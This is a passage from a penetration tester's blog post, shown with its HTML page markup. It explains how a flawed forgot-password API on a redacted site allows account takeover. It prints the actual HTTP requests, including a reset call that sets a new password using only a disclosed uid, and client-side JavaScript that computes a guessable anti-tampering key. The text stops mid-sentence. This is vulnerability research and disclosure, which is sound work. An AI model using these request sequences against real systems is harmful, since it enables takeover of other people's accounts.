<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Defeating custom password reset tokens" />
<meta property="og:locale" content="en" />
<meta name="description" content="This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks." />
<meta property="og:description" content="This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks." />
<link rel="canonical" href="http://localhost:4000/posts/hacking-custom-reset-password-tokens/" />
<meta property="og:url" content="http://localhost:4000/posts/hacking-custom-reset-password-tokens/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/custom-password-reset-tokens/thumbnail.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-05-16T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/custom-password-reset-tokens/thumbnail.png" />
<meta property="twitter:title" content="Defeating custom password reset tokens" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-16T00:00:00+02:00","datePublished":"2023-05-16T00:00:00+02:00","description":"This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks.","headline":"Defeating custom password reset tokens","image":"http://localhost:4000/assets/img/custom-password-reset-tokens/thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hacking-custom-reset-password-tokens/"},"url":"http://localhost:4000/posts/hacking-custom-reset-password-tokens/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Defeating custom password reset tokens | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js,npm/mermaid@11.12.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Defeating custom password reset tokens</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Defeating custom password reset tokens</h1>
    
      <p class="post-desc fw-light mb-4">This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks.</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1684188000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  May 16, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/custom-password-reset-tokens/thumbnail.png" class="popup img-link preview-img shimmer"><img src="/assets/img/custom-password-reset-tokens/thumbnail.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2069 words"
>
  <em>11 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Defeating custom password reset tokens</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Defeating custom password reset tokens</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <blockquote class="abstract">
  <p>This blog post details two different ways I have used to circumvent the implementation of a flawed forgot password feature and achieve account takeover. The first technique involved using some information disclosed by the server to guess an anti-tampering token to reset any userâ€™s password, while the latter involved the exploitation of a time-based attack together with the sandwich attack to generate some forgot-password tokens and brute-force the victimâ€™s one</p>
</blockquote>

<h1 id="introduction">Introduction</h1>
<p>As mentioned in the abstract this blog post shows two different techniques I used to attack and defeat a weak forgot password implementation.</p>

<p>The first technique exploits the fact that the client-side application <strong>signed a parameter used as a checksum</strong> to validate the <em>content</em> of requests. Thanks to certain <em>information disclosed</em> by the server, it was possible to <strong>arbitrarily calculate each checksum</strong>, thus making it possible to <strong>exploit a weak forgot password function</strong> and <strong>reset the password of any user</strong>.</p>

<p>The second technique instead exploits the <em>weakness</em> of the applicationâ€™s generated password <em>reset tokens</em>. These tokens are <strong>custom-generated</strong> and are <strong>easily reconstructed</strong>. Since every user can register and create an account on this application, it was possible to use the <em>single-packet attack</em> <sup id="fnref:single-packet-attack"><a href="#fn:single-packet-attack" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> technique together with the <em>sandwich attack</em> <sup id="fnref:sandwich-attack"><a href="#fn:sandwich-attack" class="footnote" rel="footnote" role="doc-noteref">2</a></sup> to <strong>generate three tokens at the same</strong> time and through a bit of analysis and brute-force, <strong>obtain the specific token for the victim account</strong>.</p>

<p>Lets now take a closer look at the two attacks ðŸ”Ž.</p>

<h1 id="breaking-weak-client-side-checksum-using-disclosed-information">Breaking weak client-side checksum using disclosed information</h1>

<h2 id="forgot-password-http-requests"><span class="me-2">Forgot password HTTP requests</span><a href="#forgot-password-http-requests" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>The target application provided an API used to reset a userâ€™s password when he forgot it. The API was <code class="language-plaintext highlighter-rouge">/services/foo/login/v1/forgotpassword</code> and accepted a specific JSON body. If the email existed, the server returned the <code class="language-plaintext highlighter-rouge">uid</code> field of the selected e-mail as a response, sending the relevant password reset e-mail in the meantime:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/services/foo/login/v1/forgotpassword</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.redacted.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"ldapValRequest"</span><span class="p">:{</span><span class="w">
        </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"0xbro-test-1337@yopmail.com"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"flag"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"requestData"</span><span class="p">:{</span><span class="w">
            </span><span class="nl">"clientAppId"</span><span class="p">:</span><span class="s2">"FLTUSEN"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"dataSizeKey"</span><span class="p">:</span><span class="s2">"681fbb020ca58f49ad1ad41c1689e501253c8493c761ee3eb7046c8c0b7fb216"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="err">HTTP/</span><span class="mi">2</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="err">OK</span><span class="w">
</span><span class="err">Content-Type:</span><span class="w"> </span><span class="err">application/json</span><span class="w">

</span><span class="p">{</span><span class="w">
    </span><span class="nl">"ldapValResponse"</span><span class="p">:{</span><span class="w">
    </span><span class="nl">"errors"</span><span class="p">:[],</span><span class="w">
    </span><span class="nl">"status"</span><span class="p">:</span><span class="s2">"true"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"0xbro-test-1337@yopmail.com"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"uid"</span><span class="p">:</span><span class="s2">"FLTUSENE2407040512811107W"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Clicking the link arrived by email users were then prompted to insert the new password for their account. At this point, the application validated the token sent by email via the <code class="language-plaintext highlighter-rouge">/services/foo/login/v1/password/validation</code> API:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/services/foo/login/v1/password/validation</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.redacted.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"frgtPwdGetQuestionRequest"</span><span class="p">:{</span><span class="w">
        </span><span class="nl">"token"</span><span class="p">:</span><span class="s2">"FLTUSENO07a43608"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"requestData"</span><span class="p">:{</span><span class="w">
            </span><span class="nl">"clientAppId"</span><span class="p">:</span><span class="s2">"FLTUSEN"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"country"</span><span class="p">:</span><span class="s2">"US"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"language"</span><span class="p">:</span><span class="s2">"EN"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"vin"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"dataSizeKey"</span><span class="p">:</span><span class="s2">"7aafb36a4fd657ccedd97c24b2f65eb041b6430e5b28d82071fa41106ec18577"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="err">HTTP/</span><span class="mi">2</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="err">OK</span><span class="w">
</span><span class="err">Content-Type:</span><span class="w"> </span><span class="err">application/json</span><span class="w">

</span><span class="p">{</span><span class="w">
    </span><span class="nl">"frgtPwdGetQuestionResponse"</span><span class="p">:{</span><span class="w">
        </span><span class="nl">"data"</span><span class="p">:{</span><span class="w">
            </span><span class="nl">"pwdQuestion"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"pwdQuestion2"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"uid"</span><span class="p">:</span><span class="s2">"FLTUSENE2407040512811107W"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"0xbro-test-1337@yopmail.com"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="s2">"true"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>If the <code class="language-plaintext highlighter-rouge">status</code> was <code class="language-plaintext highlighter-rouge">true</code>, the application proceeded to reset the userâ€™s password via the <code class="language-plaintext highlighter-rouge">/services/foo/login/v1/password/reset</code> API:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/services/foo/login/v1/password/reset</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.redacted.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"rstPasswordRequest"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"requestData"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"clientAppId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"FLTUSEN"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"country"</span><span class="p">:</span><span class="w"> </span><span class="s2">"US"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"language"</span><span class="p">:</span><span class="w"> </span><span class="s2">"EN"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"FLTUSENE2407040512811107W"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"newPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pwn3dAcc"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"dataSizeKey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="err">HTTP/</span><span class="mi">2</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="err">OK</span><span class="w">
</span><span class="err">Content-Type:</span><span class="w"> </span><span class="err">application/json</span><span class="w">

</span><span class="p">{</span><span class="nl">"rstPasswordResponse"</span><span class="p">:{</span><span class="nl">"status"</span><span class="p">:</span><span class="s2">"true"</span><span class="p">}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Taking a closer look at the whole process, we can notice the following issues:</p>
<ol>
  <li>The solution never uses tokens generated using a cryptographically safe algorithm</li>
  <li>The <code class="language-plaintext highlighter-rouge">uid</code> field required to reset a specific userâ€™s password is disclosed before the reset token is validated</li>
  <li>The <code class="language-plaintext highlighter-rouge">/password/reset</code> API takes for granted that the password reset token has already been validated since we have a valid <code class="language-plaintext highlighter-rouge">uid</code> and the token is not included in the request</li>
</ol>

<p>By combining all these factors, it seems possible to reset a userâ€™s password knowing only the e-mail address.</p>

<p>We can see, however, that every request sent to APIs contains a <code class="language-plaintext highlighter-rouge">dataSizeKey</code> field that seems to serve as an <em>anti-tampering token</em>. Theoretically, this field should prevent the possibility of re-sending the same password reset request to a user with a different <code class="language-plaintext highlighter-rouge">uid</code>. As we can observe, however, this field is <strong>never</strong> included in server responses, but only ever appears inside HTTP requests, which means that it is <em>necessarily calculated client-side</em>.</p>

<p>But how?</p>

<h2 id="guessing-datasizekey"><span class="me-2">Guessing <code class="language-plaintext highlighter-rouge">dataSizeKey</code></span><a href="#guessing-datasizekey" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Taking a look at the javascript file <code class="language-plaintext highlighter-rouge">ForgotPassword.js</code> used to send the forgot password request, we can see that the <code class="language-plaintext highlighter-rouge">dataSizeKey</code> field is <em>calculated using only values known to the user</em>:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="p">...</span>
<span class="kd">var</span> <span class="nx">clientAppId</span> <span class="o">=</span> <span class="nx">FG</span><span class="p">.</span><span class="nx">clientAppId</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dataSizeKey</span> <span class="o">=</span> <span class="nf">formvault</span><span class="p">(</span><span class="nx">clientAppId</span> <span class="o">+</span> <span class="nx">emailID</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">var</span> <span class="nx">reqstData</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">ldapValRequest</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="nx">emailID</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">requestData</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">clientAppId</span><span class="dl">"</span><span class="p">:</span> <span class="nx">clientAppId</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">dataSizeKey</span><span class="dl">"</span><span class="p">:</span> <span class="nx">dataSizeKey</span>
    <span class="p">}</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>
<p>What about the token sent in the password reset request?</p>

<p>I have never been good at equations, but if</p>
